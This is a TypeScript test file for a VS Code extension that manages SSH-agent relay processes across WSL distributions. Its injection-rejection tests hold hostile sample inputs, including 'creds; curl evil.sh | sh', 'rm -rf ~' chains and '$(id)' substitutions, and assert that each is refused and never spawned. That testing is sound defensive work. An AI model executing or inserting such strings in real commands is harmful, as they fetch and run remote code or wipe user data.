import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  RC_MARKER,
  envPrefix,
  isSafeShellWord,
  parseDistros,
  rcAlreadyHasIt,
  rcSnippet,
  relayArgv,
  socketFromBusyLine,
  socketFromExportLine,
  toWslPath,
  SOCKET_ALIVE,
  lineAssembler,
  socketAliveArgv,
} from '../wslRelay';
import { MAX_QUICK_FAILURES, QUICK_FAILURE_MS, RelayProcess, WslRelayManager } from '../wslRelayManager';

test('the relay runs through a login shell, because that is where PATH is', () => {
  // `wsl.exe -e creds relay` searches the default PATH, and `creds` is normally on one a person's
  // own profile sets. `exec` so bash replaces itself and the parent holds the relay directly.
  assert.deepEqual(relayArgv('creds', ''), ['-e', 'bash', '-lc', 'exec creds relay']);
});

test('a named distribution is selected rather than assumed', () => {
  // Three distributions is the normal case, and the default is rarely the one being worked in.
  assert.deepEqual(relayArgv('creds', 'Ubuntu-26.04'), [
    '-d',
    'Ubuntu-26.04',
    '-e',
    'bash',
    '-lc',
    'exec creds relay',
  ]);
});

test('anything that is not a plain word is REFUSED, never escaped', () => {
  // These arrive from settings, and settings are workspace-writable — a repository can ship a
  // .vscode/settings.json. Nothing quotable is accepted, so there is nothing to quote correctly.
  assert.equal(isSafeShellWord('creds'), true);
  assert.equal(isSafeShellWord('/home/me/.local/bin/creds'), true);
  assert.equal(isSafeShellWord('creds; curl evil.sh | sh'), false);
  assert.equal(isSafeShellWord('creds && rm -rf ~'), false);
  assert.equal(isSafeShellWord('$(whoami)'), false);
  assert.equal(isSafeShellWord('creds `id`'), false);
  assert.equal(isSafeShellWord(''), false);
});

test('the socket comes from what the relay SAID, not from a second copy of the rule', () => {
  // The path is decided by AgentRelay.DefaultSocketPath in the CLI. Deriving it again here would
  // be two implementations of one rule, free to drift.
  assert.equal(socketFromExportLine('export SSH_AUTH_SOCK=/run/user/1000/creds-agent.sock'), '/run/user/1000/creds-agent.sock');
  assert.equal(socketFromExportLine('  export SSH_AUTH_SOCK=/tmp/creds-agent-me.sock  '), '/tmp/creds-agent-me.sock');
});

test('a line that is not the export line yields nothing', () => {
  assert.equal(socketFromExportLine('[creds-for-devs] relay listening on /run/x.sock'), '');
  assert.equal(socketFromExportLine(''), '');
});

test('the rc block is recognised by its marker, not by the path', () => {
  // Someone who moved the socket with CREDS_RELAY_SOCKET has our line and a path we would not
  // match; appending a second export would quietly fight their choice.
  const written = rcSnippet('/run/user/1000/creds-agent.sock');
  assert.ok(written.includes(RC_MARKER));
  assert.equal(rcAlreadyHasIt(`# other things\n${written}\nalias ll='ls -l'`), true);
  assert.equal(rcAlreadyHasIt('export SSH_AUTH_SOCK=/somewhere/else.sock'), false);
});

// --- the lifetime, which is the part you would otherwise learn overnight --------------------

interface Fake extends RelayProcess {
  killed: boolean;
  end(code: number | null): void;
  say(line: string): void;
}

function fakes(): { spawner: (args: readonly string[]) => RelayProcess; started: Fake[]; argv: string[][] } {
  const started: Fake[] = [];
  const argv: string[][] = [];
  const spawner = (args: readonly string[]): RelayProcess => {
    argv.push([...args]);
    let settle: (code: number | null) => void = () => undefined;
    const lines: ((line: string) => void)[] = [];
    const fake: Fake = {
      killed: false,
      kill: (): void => {
        fake.killed = true;
      },
      exited: new Promise<number | null>((resolve) => {
        settle = resolve;
      }),
      onLine: (handler): void => {
        lines.push(handler);
      },
      end: (code): void => settle(code),
      say: (line): void => lines.forEach((handler) => handler(line)),
    };
    started.push(fake);
    return fake;
  };
  return { spawner, started, argv };
}

const settled = (): Promise<void> => new Promise((resolve) => setImmediate(resolve));

test('starting learns the socket from the relay itself', async () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  assert.deepEqual(manager.start('creds', ['']), { ok: true });
  assert.equal(manager.socketPathFor(''), '');
  started[0].say('export SSH_AUTH_SOCK=/run/user/1000/creds-agent.sock');

  assert.equal(manager.socketPathFor(''), '/run/user/1000/creds-agent.sock');
  manager.dispose();
});

test('an unsafe command never reaches a shell', () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  const result = manager.start('creds; curl evil.sh | sh', ['']);

  assert.equal(result.ok, false);
  assert.equal(started.length, 0, 'nothing was spawned');
});

test('stopping kills the child and forgets where it was listening', async () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['']);
  started[0].say('export SSH_AUTH_SOCK=/run/a.sock');

  manager.stop();

  assert.equal(started[0].killed, true);
  assert.equal(manager.socketPathFor(''), '');
  assert.equal(manager.running, false);
});

test('a child killed by stop() does not come back when its exit lands', async () => {
  // The exit of a killed process resolves AFTER stop() returns. Without the identity check that
  // late resolution restarts a relay the caller has just turned off.
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['']);

  manager.stop();
  started[0].end(null);
  await settled();

  assert.equal(started.length, 1, 'no relay was started again');
});

test('a relay that dies on its own is restarted', async () => {
  let now = 0;
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined, () => now);
  manager.start('creds', ['']);

  now += QUICK_FAILURE_MS * 10; // it ran for a while, then the distribution went away
  started[0].end(1);
  await settled();

  assert.equal(started.length, 2);
  manager.dispose();
});

test('a relay that cannot start is given up on rather than respawned forever', async () => {
  // The common failure is `creds` not being installed in the distribution. Without a bound this
  // would be a login shell started every few milliseconds for the rest of the session.
  let now = 0;
  const messages: string[] = [];
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, (m) => messages.push(m), () => now);
  manager.start('creds', ['']);

  for (let attempt = 0; attempt < MAX_QUICK_FAILURES; attempt += 1) {
    now += 10; // instantly
    started[started.length - 1].end(127);
    await settled();
  }

  assert.equal(started.length, MAX_QUICK_FAILURES);
  assert.ok(
    messages.some((m) => m.includes('not restarting it again')),
    `the log said: ${JSON.stringify(messages)}`,
  );
});

test('a run that lasted resets the patience', async () => {
  let now = 0;
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined, () => now);
  manager.start('creds', ['']);

  now += 10;
  started[0].end(1); // quick failure 1
  await settled();
  now += QUICK_FAILURE_MS * 2;
  started[1].end(1); // ran fine for a while — not a startup failure
  await settled();
  now += 10;
  started[2].end(1); // quick failure 1 again, not 3
  await settled();

  assert.equal(started.length, 4, 'still trying, because the counter was reset');
  manager.dispose();
});

// --- more than one distribution (0.77.0) ----------------------------------------------------
//
// A socket lives inside one distribution's filesystem, so a relay in `Ubuntu` is invisible from
// `Ubuntu-26.04`. Two distributions need two relays; the first version held one child and served
// whichever WSL called default, which is a choice made for the person rather than by them.

test('wsl -l -q is UTF-16, and reading it as UTF-8 finds nothing', () => {
  // Measured: the bytes begin 55 00 62 00. Decoded as UTF-8 every name comes back interleaved
  // with NULs and matches nothing — a failure that reads as "no distributions found".
  const raw = Buffer.from('Ubuntu\r\ndocker-desktop\r\nUbuntu-26.04\r\n', 'utf16le');

  assert.deepEqual(parseDistros(raw), ['Ubuntu', 'Ubuntu-26.04']);
});

test("Docker's own distributions are not offered, because they have no shell to configure", () => {
  const raw = Buffer.from('docker-desktop\r\ndocker-desktop-data\r\n', 'utf16le');

  assert.deepEqual(parseDistros(raw), []);
});

test('each chosen distribution gets its own relay, named on the command line', () => {
  const { spawner, argv } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04']);

  assert.equal(argv.length, 2);
  assert.deepEqual(argv[0], ['-d', 'Ubuntu', '-e', 'bash', '-lc', 'exec creds relay']);
  assert.deepEqual(argv[1], ['-d', 'Ubuntu-26.04', '-e', 'bash', '-lc', 'exec creds relay']);
  assert.deepEqual(manager.serving(), ['Ubuntu', 'Ubuntu-26.04']);
  manager.dispose();
});

test('their sockets are kept apart — one path per distribution', () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04']);

  started[0].say('export SSH_AUTH_SOCK=/run/user/1000/creds-agent.sock');
  started[1].say('export SSH_AUTH_SOCK=/tmp/creds-agent-jinx.sock');

  assert.equal(manager.socketPathFor('Ubuntu'), '/run/user/1000/creds-agent.sock');
  assert.equal(manager.socketPathFor('Ubuntu-26.04'), '/tmp/creds-agent-jinx.sock');
  manager.dispose();
});

test('a distribution without `creds` is given up on WITHOUT taking the others down', async () => {
  // The likely reality: someone installs the CLI in the one they work in and not the other.
  let now = 0;
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined, () => now);
  manager.start('creds', ['Good', 'Broken']);
  started[0].say('export SSH_AUTH_SOCK=/run/good.sock');

  for (let attempt = 0; attempt < MAX_QUICK_FAILURES; attempt += 1) {
    now += 10;
    started[started.length - 1].end(127); // the newest is always the Broken respawn
    await settled();
  }

  assert.equal(manager.socketPathFor('Good'), '/run/good.sock', 'the working one is untouched');
  assert.ok(!manager.serving().includes('Broken'));
  manager.dispose();
});

test('stopping takes every distribution down, not just the last one', () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04']);

  manager.stop();

  assert.deepEqual(started.map((s) => s.killed), [true, true]);
  assert.equal(manager.running, false);
});

test('an unsafe distribution name never reaches a shell, and nothing starts', () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  const result = manager.start('creds', ['Ubuntu', 'x; curl evil.sh | sh']);

  assert.equal(result.ok, false);
  assert.equal(started.length, 0, 'not even the safe one was spawned');
});

// --- telling the relay where the Windows half is (0.79.0) -----------------------------------
//
// A relay spawns `creds.exe relay-pipe` per connection and looks on the PATH; the installer puts
// that binary in the extension's global storage, which is on nobody's PATH. Someone could install
// both halves through the buttons and still be told only "communication with agent failed".

test('the Windows binary is named on the command line, not hoped for on the PATH', () => {
  const argv = relayArgv('creds', 'Ubuntu', '/mnt/c/Users/me/creds.exe');

  assert.equal(argv[argv.length - 1], "exec env CREDS_WINDOWS_BINARY='/mnt/c/Users/me/creds.exe' creds relay");
});

test('without one it behaves exactly as before — the PATH decides', () => {
  const argv = relayArgv('creds', '');
  assert.equal(argv[argv.length - 1], 'exec creds relay');
});

test('a path that cannot be quoted is dropped rather than escaped', () => {
  // The same rule as everywhere else in this file: nothing quotable is accepted, so there is
  // nothing to quote correctly. Falling back to the PATH is where it was before.
  const argv = relayArgv('creds', '', "/mnt/c/it's here/creds.exe");

  assert.equal(argv[argv.length - 1], 'exec creds relay');
});

test('a Windows path becomes the one WSL can open', () => {
  const win = ['C:', 'Users', 'me', 'AppData', 'bin', 'creds.exe'].join(String.fromCharCode(92));
  assert.equal(toWslPath(win), '/mnt/c/Users/me/AppData/bin/creds.exe');
  assert.equal(toWslPath('D:/rsd/x.exe'), '/mnt/d/rsd/x.exe');
});

test('anything without a drive letter is handed back untouched', () => {
  // A UNC path or one already in /mnt has no translation to make, and inventing one would
  // produce a path that exists nowhere.
  assert.equal(toWslPath('/mnt/c/already/creds.exe'), '/mnt/c/already/creds.exe');
  const unc = String.fromCharCode(92).repeat(2) + 'server' + String.fromCharCode(92) + 'creds.exe';
  assert.equal(toWslPath(unc), unc);
});

test('every distribution is told the same path', () => {
  const { spawner, argv } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);

  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04'], '/mnt/c/bin/creds.exe');

  assert.ok(argv[0].join(' ').includes("CREDS_WINDOWS_BINARY='/mnt/c/bin/creds.exe'"));
  assert.ok(argv[1].join(' ').includes("CREDS_WINDOWS_BINARY='/mnt/c/bin/creds.exe'"));
  manager.dispose();
});

// `envPrefix` was this file's private `binaryPrefix` until the SSH connect path needed the same
// thing for SSH_AUTH_SOCK. Two copies of an escaping rule are two escaping rules, so it was
// extracted rather than repeated — these assert the rule that made it worth extracting.

test('a variable is set with env, never as a bare assignment prefix', () => {
  // A bare `NAME=value command` is not a command, so `exec` rejects it — and so do fish and pwsh,
  // either of which can be a WSL window's default terminal profile.
  assert.equal(envPrefix('SSH_AUTH_SOCK', '/run/user/1000/creds.sock'), "env SSH_AUTH_SOCK='/run/user/1000/creds.sock' ");
});

test('a value holding a single quote yields NO prefix rather than a broken line', () => {
  // It cannot be single-quoted, and building a line out of one would be the escaping question this
  // file refuses everywhere. Dropping it leaves the command running with the environment it had.
  assert.equal(envPrefix('SSH_AUTH_SOCK', "/tmp/it's/creds.sock"), '');
});

test('an empty value yields no prefix', () => {
  assert.equal(envPrefix('SSH_AUTH_SOCK', ''), '');
});

test('the prefix ends in a space, so a command can be concatenated straight onto it', () => {
  assert.ok(envPrefix('X', 'y').endsWith(' '));
});

// --- adopting a relay somebody else already had running ------------------------------------
//
// Found by a person clicking the button, 2026-09-17. A relay was up and WORKING — `ssh-add -l`
// through it listed the key and it had a dozen live connections — and a second one is correctly
// refused rather than allowed to hijack the socket. But that refusal goes to stderr, which the
// manager forwarded to the log without reading, so it learned no socket and the setup said
// "the relay in Ubuntu reported no socket. Check that `creds` is installed there" — a false
// statement, pointing at the wrong thing, about a relay that was fine.

test('the refusal NAMES the live socket, and that name is read rather than logged away', () => {
  assert.equal(
    socketFromBusyLine(
      '[creds-for-devs] /run/user/1000/creds-agent.sock is already served by a live relay. ' +
        'Use that one, or set CREDS_RELAY_SOCKET to a different path.',
    ),
    '/run/user/1000/creds-agent.sock',
  );
});

test('any other line yields nothing, so a reworded CLI degrades to what it did before', () => {
  assert.equal(socketFromBusyLine('[creds-for-devs] relay listening on /run/x.sock'), '');
  assert.equal(socketFromBusyLine('export SSH_AUTH_SOCK=/run/x.sock'), '');
  assert.equal(socketFromBusyLine(''), '');
});

test('a relay that is already served is ADOPTED, not reported as missing', async () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['']);

  started[0].say('[creds-for-devs] /run/user/1000/creds-agent.sock is already served by a live relay.');
  started[0].end(1); // our child refuses and exits
  await settled();

  assert.equal(
    manager.socketPathFor(''),
    '/run/user/1000/creds-agent.sock',
    'the working relay was declared missing',
  );
  assert.deepEqual(manager.serving(), [''], 'and the distribution is still being served');
  manager.dispose();
});

test('an adopted relay is not restarted — a second child would collide with the same socket', async () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['']);

  started[0].say('[creds-for-devs] /run/user/1000/creds-agent.sock is already served by a live relay.');
  started[0].end(1);
  await settled();

  assert.equal(started.length, 1, 'it spawned again into the same collision');
  manager.dispose();
});

test('adopting does not kill what is serving the socket — it is somebody else’s process', async () => {
  const { spawner, started } = fakes();
  const manager = new WslRelayManager(spawner, () => undefined);
  manager.start('creds', ['']);
  started[0].say('[creds-for-devs] /run/user/1000/creds-agent.sock is already served by a live relay.');
  started[0].end(1);
  await settled();

  manager.stop();

  // Our own child had already exited; `kill` on it is a no-op, and nothing else is reachable from
  // here. What must NOT happen is the manager believing it owns the other relay's lifetime.
  assert.equal(manager.socketPathFor(''), '', 'stopping forgets the socket, as it always did');
});

// --- whole lines out of a stream that arrives in slices ---------------------------------------
//
// Raised by a review of the adoption change, and the consequence is not a missed log line: a
// refusal cut in half matches nothing, so the manager declares a LIVE relay broken, drops the entry
// on exit and spends the retry budget restarting something that was never down.

test('a refusal split across two chunks is still ONE line', () => {
  const seen: string[] = [];
  const assembler = lineAssembler((line) => seen.push(line));

  assembler.push('/run/user/1000/creds.sock is alre');
  assert.deepEqual(seen, [], 'half a line is not a line');
  assembler.push('ady served by a live relay\n');

  assert.deepEqual(seen, ['/run/user/1000/creds.sock is already served by a live relay']);
  assert.equal(
    socketFromBusyLine(seen[0]),
    '/run/user/1000/creds.sock',
    'and the reassembled line is the one the manager can act on',
  );
});

test('a chunk carrying several lines delivers every one of them', () => {
  const seen: string[] = [];
  const assembler = lineAssembler((line) => seen.push(line));

  assembler.push('first\nsecond\r\nthird\n');

  assert.deepEqual(seen, ['first', 'second', 'third'], 'and CRLF counts as one ending, not two');
});

test('a last line with no newline is released when the stream ends', () => {
  // The case that matters most: a relay which refuses and exits writes exactly one line, and
  // nothing guarantees it ends in a newline.
  const seen: string[] = [];
  const assembler = lineAssembler((line) => seen.push(line));

  assembler.push('/tmp/x.sock is already served by a live relay');
  assert.deepEqual(seen, []);
  assembler.end();

  assert.deepEqual(seen, ['/tmp/x.sock is already served by a live relay']);
});

test('end() releases nothing twice, and blank lines are never delivered', () => {
  const seen: string[] = [];
  const assembler = lineAssembler((line) => seen.push(line));

  assembler.push('one\n\n   \n');
  assembler.end();
  assembler.end();

  assert.deepEqual(seen, ['one'], 'both streams emit blank lines and no handler wants one');
});

// --- asking whether an adopted socket is still there --------------------------------------------

test('the probe echoes a WORD, so silence can never read as success', () => {
  // Every failure on this path — a stopped distribution, a timeout, a killed child — collapses to
  // empty output. A probe that took the exit code alone would call a dead socket alive the first
  // time anything hiccupped.
  const argv = socketAliveArgv('Ubuntu', '/run/user/1000/creds.sock');

  assert.deepEqual(argv, [
    '-d',
    'Ubuntu',
    '-e',
    'sh',
    '-c',
    `test -S /run/user/1000/creds.sock && echo ${SOCKET_ALIVE}`,
  ]);
});

test('the default distribution takes no -d, exactly as relayArgv does', () => {
  assert.deepEqual(socketAliveArgv('', '/tmp/x.sock').slice(0, 2), ['-e', 'sh']);
});

test('a socket path that cannot be a shell word yields NO argv at all', () => {
  // The caller must read this as "not alive" rather than "not checked" — the same refusal an
  // unquotable socket already gets before the line is composed.
  for (const bad of ['/tmp/a b.sock', '/tmp/$(id).sock', '/tmp/x;rm -rf ~', '']) {
    assert.deepEqual(socketAliveArgv('Ubuntu', bad), [], bad);
  }
});
